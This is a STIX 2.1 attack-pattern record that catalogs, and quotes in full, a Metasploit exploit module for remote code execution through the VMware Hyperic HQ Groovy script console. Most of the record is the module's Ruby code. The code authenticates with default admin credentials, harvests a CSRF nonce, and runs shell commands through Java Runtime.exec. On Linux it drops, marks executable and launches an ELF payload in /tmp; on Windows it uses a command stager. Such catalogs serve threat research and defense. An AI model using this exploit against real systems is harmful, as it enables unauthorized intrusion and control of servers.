{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3e6aa248-15a9-4974-8b3c-19bff7e971d7",
    "created": "2024-08-14T17:09:35.760836Z",
    "modified": "2024-08-14T17:09:35.76084Z",
    "name": "VMware Hyperic HQ Groovy Script-Console Java Execution",
    "description": " This module uses the VMware Hyperic HQ Groovy script console to execute OS commands using Java. Valid credentials for an application administrator user account are required. This module has been tested successfully with Hyperic HQ 4.6.6 on Windows 2003 SP2 and Ubuntu 10.04 systems. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/hyperic_hq_script_console.rb",
            "external_id": "hyperic_hq_script_console.rb"
        },
        {
            "source_name": "reference",
            "url": "https://pubs.vmware.com/vfabric5/topic/com.vmware.vfabric.hyperic.4.6/ui-Groovy.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VMware Hyperic HQ Groovy Script-Console Java Execution',\n      'Description'    => %q{\n        This module uses the VMware Hyperic HQ Groovy script console to execute\n        OS commands using Java. Valid credentials for an application administrator\n        user account are required. This module has been tested successfully with\n        Hyperic HQ 4.6.6 on Windows 2003 SP2 and Ubuntu 10.04 systems.\n      },\n      'Author'         =>\n        [\n          'bcoles' # Metasploit\n        ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' =>\n        {\n          'WfsDelay'   => '15',\n        },\n      'References'     =>\n        [\n          ['URL', 'https://pubs.vmware.com/vfabric5/topic/com.vmware.vfabric.hyperic.4.6/ui-Groovy.html']\n        ],\n      'Targets'        =>\n        [\n          # Tested on Hyperic HQ versions 4.5.2-win32 and 4.6.6-win32 on Windows XP SP3 and Ubuntu 10.04\n          ['Automatic', {} ],\n          ['Windows',  {'Arch' => ARCH_X86, 'Platform' => 'win', 'CmdStagerFlavor' => 'vbs'}],\n          ['Linux',    {'Arch' => ARCH_X86, 'Platform' => 'linux' }],\n          ['Unix CMD', {'Arch' => ARCH_CMD, 'Platform' => 'unix', 'Payload' => {'BadChars' => \"\\x22\"}}]\n      ],\n      'Platform'       => %w{ win linux unix },\n      'Privileged'     => false, # Privileged on Windows but not on *nix targets\n      'DisclosureDate' => '2013-10-10',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        Opt::RPORT(7443),\n        OptString.new('USERNAME',  [ true, 'The username for the application', 'hqadmin' ]),\n        OptString.new('PASSWORD',  [ true, 'The password for the application', 'hqadmin' ]),\n        OptString.new('TARGETURI', [ true, 'The path to HypericHQ', '/' ]),\n      ])\n\n    self.needs_cleanup = true\n  end\n\n  #\n  # Login\n  #\n  def login(user, pass)\n    @cookie = \"JSESSIONID=#{Rex::Text.rand_text_hex(32)}\"\n\n    res = send_request_cgi({\n      'uri'       => normalize_uri(@uri.path, 'j_spring_security_check'),\n      'method'    => 'POST',\n      'cookie'    => @cookie,\n      'encode_params' => false,\n      'vars_post' => {\n        'j_username' => Rex::Text.uri_encode(user, 'hex-normal'),\n        'j_password' => Rex::Text.uri_encode(pass, 'hex-normal'),\n        'submit'     => 'Sign+in'\n      },\n      'vars_get'  => {\n        'org.apache.catalina.filters.CSRF_NONCE' => ''\n      }\n    })\n\n    res\n  end\n\n  #\n  # Check access to the Groovy script console and get CSRF nonce\n  #\n  def get_nonce\n    res = send_request_cgi({\n      'uri' => normalize_uri(@uri.path, 'mastheadAttach.do'),\n      'cookie' => @cookie,\n      'encode_params' => false,\n      'vars_get' => {\n        'typeId' => '10003'\n      }\n    })\n\n    if not res or res.code != 200\n      print_warning(\"Could not access the script console\")\n    end\n\n    if res.body =~ /org\\.apache\\.catalina\\.filters\\.CSRF_NONCE=([A-F\\d]+)/\n      @nonce = $1\n      vprint_status(\"Found token '#{@nonce}'\")\n    end\n  end\n\n  #\n  # Check credentials and check for access to the Groovy console\n  #\n  def check\n\n    @uri = target_uri\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n\n    # login\n    vprint_status(\"Authenticating as '#{user}'\")\n    res  = login(user, pass)\n    if res and res.code == 302 and res.headers['location'] !~ /authfailed/\n      vprint_good(\"Authenticated successfully as '#{user}'\")\n      # check access to the console\n      vprint_status(\"Checking access to the script console\")\n      get_nonce\n      if @nonce.nil?\n        return Exploit::CheckCode::Detected\n      else\n        return Exploit::CheckCode::Appears\n      end\n    elsif res.headers.include?('X-Jenkins') or res.headers['location'] =~ /authfailed/\n      vprint_error(\"Authentication failed\")\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n  end\n\n  def on_new_session(client)\n    if not @to_delete.nil?\n      print_warning(\"Deleting #{@to_delete} payload file\")\n      execute_command(\"rm #{@to_delete}\")\n    end\n  end\n\n  def http_send_command(java)\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(@uri.path, 'hqu/gconsole/console/execute.hqu?org.apache.catalina.filters.CSRF_NONCE=')+@nonce,\n      'cookie'    => @cookie,\n      'encode_params' => false,\n      'vars_post' => {\n        'code' => java # java_craft_runtime_exec(cmd)\n      }\n    })\n    if res and res.code == 200 and res.body =~ /Executed/\n      vprint_good(\"Command executed successfully\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to execute the command.\")\n    end\n    # version 4.6.6 returns a new CSRF nonce in the response\n    if res.body =~ /org\\.apache\\.catalina\\.filters\\.CSRF_NONCE=([A-F\\d]+)/\n      @nonce = $1\n      vprint_status(\"Found token '#{@nonce}'\")\n    # version 4.5.2 does not, so we request a new one\n    else\n      get_nonce\n    end\n\n    return res\n  end\n\n  # Stolen from jenkins_script_console.rb\n  def java_craft_runtime_exec(cmd)\n    decoder = Rex::Text.rand_text_alpha(5, 8)\n    decoded_bytes = Rex::Text.rand_text_alpha(5, 8)\n    cmd_array = Rex::Text.rand_text_alpha(5, 8)\n    jcode =  \"sun.misc.BASE64Decoder #{decoder} = new sun.misc.BASE64Decoder();\\n\"\n    jcode << \"byte[] #{decoded_bytes} = #{decoder}.decodeBuffer(\\\"#{Rex::Text.encode_base64(cmd)}\\\");\\n\"\n\n    jcode << \"String [] #{cmd_array} = new String[3];\\n\"\n    if @my_target['Platform'] == 'win'\n      jcode << \"#{cmd_array}[0] = \\\"cmd.exe\\\";\\n\"\n      jcode << \"#{cmd_array}[1] = \\\"/c\\\";\\n\"\n    else\n      jcode << \"#{cmd_array}[0] = \\\"/bin/sh\\\";\\n\"\n      jcode << \"#{cmd_array}[1] = \\\"-c\\\";\\n\"\n    end\n    jcode << \"#{cmd_array}[2] = new String(#{decoded_bytes}, \\\"UTF-8\\\");\\n\"\n    jcode << \"Runtime.getRuntime().exec(#{cmd_array});\"\n    jcode\n  end\n\n  def java_get_os\n    jcode = \"System.getProperty(\\\"os.name\\\").toLowerCase();\"\n\n    return jcode\n  end\n\n  def execute_command(cmd, opts = {})\n    vprint_status(\"Attempting to execute: #{cmd}\")\n    http_send_command(java_craft_runtime_exec(cmd))\n  end\n\n  # Stolen from jenkins_script_console.rb\n  def linux_stager\n    cmds = \"echo LINE | tee FILE\"\n    exe  = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)\n    base64 = Rex::Text.encode_base64(exe)\n    base64.gsub!(/\\=/, \"\\\\u003d\")\n    file = rand_text_alphanumeric(6+rand(4))\n\n    execute_command(\"touch /tmp/#{file}.b64\")\n    cmds.gsub!(/FILE/, \"/tmp/\" + file + \".b64\")\n    base64.each_line do |line|\n      line.chomp!\n      cmd = cmds\n      cmd.gsub!(/LINE/, line)\n      execute_command(cmds)\n    end\n\n    execute_command(\"base64 -d /tmp/#{file}.b64|tee /tmp/#{file}\")\n    execute_command(\"chmod +x /tmp/#{file}\")\n    execute_command(\"rm /tmp/#{file}.b64\")\n\n    execute_command(\"/tmp/#{file}\")\n    @to_delete = \"/tmp/#{file}\"\n  end\n\n  def get_target\n    res = http_send_command(java_get_os)\n\n    if res and res.code == 200 and res.body =~ /\"result\":\"(.*)\",\"timeStatus/\n      os = $1\n    else\n      return nil\n    end\n\n    case os\n    when /win/\n      return targets[1]\n    when /linux/\n      return targets[2]\n    when /nix/\n    when /mac/\n    when /aix/\n    when /sunow/\n      return targets[3]\n    else\n      return nil\n    end\n\n  end\n\n  def exploit\n\n    # login\n    @uri = target_uri\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n    res  = login(user, pass)\n    if res and res.code == 302 and res.headers['location'] !~ /authfailed/\n      print_good(\"Authenticated successfully as '#{user}'\")\n    else\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed\")\n    end\n\n    # check access to the console and get CSRF nonce\n    print_status(\"Checking access to the script console\")\n    get_nonce\n\n    # check operating system\n    if target.name =~ /Automatic/\n      print_status(\"Trying to detect the remote target...\")\n      @my_target = get_target\n      if @my_target.nil?\n        fail_with(Failure::NoTarget, \"#{peer} - Failed to detect the remote target\")\n      else\n        print_good(\"#{@my_target.name} target found\")\n      end\n    else\n      @my_target = target\n    end\n\n    # send payload\n    case @my_target['Platform']\n    when 'win'\n      print_status(\"Sending command stager...\")\n      execute_cmdstager({:linemax => 2049})\n    when 'unix'\n      print_status(\"Sending UNIX payload...\")\n      http_send_command(java_craft_runtime_exec(payload.encoded))\n    when 'linux'\n      print_status(\"#{rhost}:#{rport} - Sending Linux stager...\")\n      linux_stager\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-10",
    "x_mitre_platforms": [
        "%w{ win linux unix }"
    ]
}